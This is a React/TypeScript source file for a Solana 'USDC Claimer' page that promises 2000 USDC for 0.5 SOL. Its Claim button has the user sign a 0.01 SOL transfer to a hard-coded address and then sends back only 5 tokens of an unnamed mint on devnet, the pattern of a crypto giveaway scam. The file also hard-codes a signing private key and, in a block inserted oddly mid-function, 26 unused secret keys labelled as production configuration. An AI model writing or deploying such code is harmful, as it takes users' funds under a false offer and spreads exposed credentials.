/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "423wzErHEToWcFVY7ZwDs7EYS5YniWMag6uWbE87s1adCzKDirEm76kipNotioECQxjeMPVuyuhTMPBb9uMfdEQU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3qS6nSsoyd4UcaUyUittmd5uhmpBcY8Fnipn4BV527vAC5WesyWLtuhiceFXSFYxLtQe1CfW9kqfYp6G1YiV7hAd",
  "key1": "45uPyTixBHazMayfjWyEBc5xjqtzJBPnNwqm7M52XLP7emjSXgDen9WJ4HS2PFzUv4rzU4VRUcfLLgn1psTonMvs",
  "key2": "cLJaCLbsiUiRSo3VUDrdRjVH6tdqNJBicr5wuzWdPGfVAyDyUZ22rzFzetXLNcSGCAx2FxdimQF3VK6gWipf59N",
  "key3": "4uwgNVFqipBUS8tWXCMitAgHHD2R3AZcu2g9kpz9FtTY1JwevM9whYsCgukAppTd8z7QDu8LtbQ4A88pAYJQ8GBp",
  "key4": "UHxYEDwi1RhGtFReA7HN4fro2oa7JxxMaWHvCSciSzndiZXhqpBwqxsqP1L92fHfnRVcDRxGb1GP84W4T8Nbszn",
  "key5": "3oc82uxrnJSAwdoPnKKsQwfN4XywaX4g5ZMZgMJwydnj6yw93pEAHmBewi73BXvhUCtLwnQUuALJEqUqYWEcuG3U",
  "key6": "2Axe18kjoKK9DPPi4iU6rc7qET8UR73u3ATpD9Mvx7Po8T9cvbzTZ4nqRJSujttB6YCrghaMmtc569iyTieoLSNZ",
  "key7": "4je6Wj957J8TjXMoP1JkP9SXxptkqTsJLRupLRZihZaMjS5Cwkn3ryU1dpCJu3u2n9371Gejw9dJaQKg9YY6CYVj",
  "key8": "28o4REDEUZ2aw9g4AQsYFMrkYQpiyGdVbYrhzFmwGaeUhigNjq3x695h7TphRR59MWwWKZcpLLCdaRpZSbMep7kU",
  "key9": "5xHsaiVzakdenjMHjDawUVurYJ4Ro8skk6BJmqNwb7V586J7ZJiWeCFeWbu7vqc4FTh8b64Fyth2cXjmxVhXZxkM",
  "key10": "24KhbijVKDhPb1MTKb4iPPBZP2GXP1fwnXoCZj37zw2jjtsSgAy5GxQxo2Rp5TgGtrBmoDUZN5kcHF7sfJZE9ZYv",
  "key11": "kSVpFJpt6GbrZQj6jrt2bEVWkuKdmzwViJ5U61ubDNierL8wwjE3oJ4BdFHrPFVZrJprNQmLoJjkHYYbLJak8o9",
  "key12": "4ZfbCVkNj6qHBWQTTKUv3F3sgrqP8VK7xKjZWku9kRpKFpCMYp9U62yz4YhU9Q6MRiRob6auzMuzvTJsZT9iQPrh",
  "key13": "3WY3kxGGBZtNvXHKkhTtaBoL9C9uPJ5kWTVtPAw7AhrjQ5PNThdptWJDY4M3uEDbiptn6NjZDdv4VmJknAEtCzG",
  "key14": "3MZtuEdSfMsKPdXNxXvEMWsBVGAzUB9DqCyiH7WF94gGgcupaLVQ2EaW8qpdixb3gh4g2xMPWxJXuRKaEBaEW42R",
  "key15": "57KvXVb8ngLcyxjeC7FwfwDn2biRsGZs3xhBZHDsrw6kQEybhANqFW1PB3Jyht3nwsE31bnAJ7AJjq3eS9T7eBJY",
  "key16": "4cGzwrtR2SZ322Hq9KAQT5552EhpykpjVQ2RHP4jYkt3aZe74wwyWaTFzHiH3ANraYEGbSyHVwiSUCof7RmjA2SQ",
  "key17": "4WXoGGTi4mtLDF49WtPCCW3RrNo9CezEHE5XFR8Mz1oZRb44QTUFPJLm315aG7TtNpy2rRvCc3BJ2SGpvesCPaeX",
  "key18": "3QcJXADwgALQUBFiMNypJQcpCvkzYUAvftiqoFxBrM12ZfqqvYwuHHaLuA4Xjus4Gf51fwV4Q7XkPzBHxwXQe3cH",
  "key19": "5kw1iAbxsrB9KGjGVSRzbTV1updcgfNSDUGVt8mSt565TJSZJUq9ksoHnyrp8qma7o8XuYdXK3P81hgNaVH88JQZ",
  "key20": "5waCYdEMErbzjRJHCQk2kY4H2DzTKnoToD88eSSZGjdQPxqcAMiKAabqzAJjTWh8aMuw1MULj3XY6wZJf3ZuX73u",
  "key21": "jigpx1K5bXtWLCSKcFKGg5oYksfbiderSmj1Dbm3mYUxtuaSzTwP2d7DzZ9a1scTo9wCgbzHd4vbWphiHBvcWa1",
  "key22": "3UWu7nxNQQ5GQ928ucpKbWXFEQ6DLS86vRiNW89XfNFNmoXLPyi1s1BVSimKGwkzru1TeF688M2pwdPKsvaNLdZc",
  "key23": "2qJbWrpTiTQJHG3q7WaDS8C6x7kiAygdv4Bf2iJjJ4b4CoPZA3LS78fqMC9tEyex6yFfAGAi9zQcpYVD4nddmhwL",
  "key24": "V1rVGrPXUyF6ZG2RP4NhiHLC1fwWbyd1nN8jMRgrv7R4M6tjXHyFPdSp1mPWYUB1zpHGEqUVsJKgrNhCUvPSimr",
  "key25": "3dKidondS9BvkvEK7u6QSpk1zSt9aua3eXk8UX8v3tTbAiwCkSG3126KoVUGgFRL5wZ2rJNy7hJuEtztQyPhZonW"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
